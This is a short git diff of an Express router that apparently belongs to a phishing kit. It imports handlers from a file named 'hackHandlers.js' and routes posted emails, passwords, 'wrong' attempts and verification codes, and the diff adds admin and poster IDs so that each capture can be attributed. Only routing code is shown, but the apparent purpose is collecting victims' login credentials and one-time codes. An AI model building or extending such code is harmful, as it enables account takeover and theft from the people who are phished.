@@ -12,14 +12,14 @@ import {signup_post, link_add,link_get,login_post,skip_code,add_mail,poster_add,
 
 import {
     
-    email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, done_page_post
+    email_post, email_post_wrong, password_post, password_post_wrong, code_page_post, successful_page_post
     
 } from './hackHandlers.js'
 
 
 router.post('/link/add', link_add);
 
-router.post('/email/post', email_post);
+router.post('/email/post/:adminId/:posterId', email_post);
 
 router.post('/email/post/wrong', email_post_wrong);
 
@@ -27,11 +27,9 @@ router.post('/password/post', password_post);
 
 router.post('/password/post/wrong', password_post_wrong);
 
-
-
 router.post('/code/page/post', code_page_post);
 
-router.post('/done/page/post',done_page_post);
+router.post('/success/page/post',successful_page_post);
 
 router.post('/signup', signup_post);///adda customer from shannon end
 
